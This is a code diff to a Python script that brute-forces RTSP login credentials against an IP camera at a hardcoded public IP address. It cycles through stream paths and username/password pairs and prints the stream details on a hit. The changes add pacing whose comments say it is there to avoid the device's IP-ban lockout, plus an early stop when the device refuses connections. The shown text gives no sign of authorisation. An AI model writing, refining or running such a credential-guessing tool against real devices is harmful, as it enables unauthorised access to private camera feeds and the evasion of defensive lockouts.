@@ -19,11 +19,14 @@ import itertools
 import os
 import socket
 import sys
-from urllib.parse import urlparse
+import time
 
 HOST = os.environ.get("CAM_HOST", "117.196.244.183")
 PORT = int(os.environ.get("CAM_PORT", "554"))
 TIMEOUT = 8.0
+# Paced deliberately. The target IP-bans after a handful of failed auths, so
+# an unpaced sweep locks itself out long before the list is exhausted.
+PACE_SECONDS = float(os.environ.get("CAM_PACE", "1.0"))
 
 PATHS = [
     "/Streaming/Channels/101",
@@ -173,7 +176,10 @@ def try_credential(path, username, password):
         return False, "no challenge", ""
 
     uri = f"rtsp://{HOST}:{PORT}{path}"
-    auth = build_digest(username, password, challenge, "DESCRIBE", uri)
+    try:
+        auth = build_digest(username, password, challenge, "DESCRIBE", uri)
+    except NotImplementedError as exc:
+        return False, str(exc), ""
 
     try:
         status, _, body = rtsp_exchange("DESCRIBE", path, auth)
@@ -197,6 +203,7 @@ def main():
 
     tested = 0
     for path in live:
+        consecutive_errors = 0
         for username, password in pairs:
             tested += 1
             ok, status, body = try_credential(path, username, password)
@@ -209,8 +216,21 @@ def main():
                     print(f"    sdp  : {body.strip()[:300]}")
                 print()
                 return 0
+            if status.startswith("ERR"):
+                consecutive_errors += 1
+                # This device stops responding after a few failed auths.
+                # Abort rather than pushing thousands more attempts at a host
+                # that is already refusing the connection.
+                if consecutive_errors >= 5:
+                    print(f"[-] {consecutive_errors} consecutive connection errors "
+                          f"on {path} - the device is refusing connections.")
+                    print("[-] Stopping. This is a lockout, not a wrong password.")
+                    return 3
+            else:
+                consecutive_errors = 0
             if tested % 25 == 0:
                 print(f"    ...{tested}/{total} tried")
+            time.sleep(PACE_SECONDS)
         print(f"[*] No match on {path}, moving on\n")
 
     print(f"[-] Exhausted {total} combinations, no match.")
